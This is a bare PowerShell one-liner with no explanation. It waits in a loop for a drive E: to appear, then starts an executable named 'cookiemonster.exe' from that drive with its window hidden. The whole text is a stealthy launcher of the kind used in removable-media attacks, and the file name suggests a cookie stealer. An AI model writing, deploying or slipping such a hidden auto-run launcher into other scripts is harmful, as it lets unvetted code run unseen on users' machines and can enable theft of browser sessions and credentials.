while ($true) { if (Test-Path -Path 'E:\') { Start-Process -FilePath 'E:\cookiemonster.exe' -WindowStyle Hidden; break } Start-Sleep -Seconds 1 }
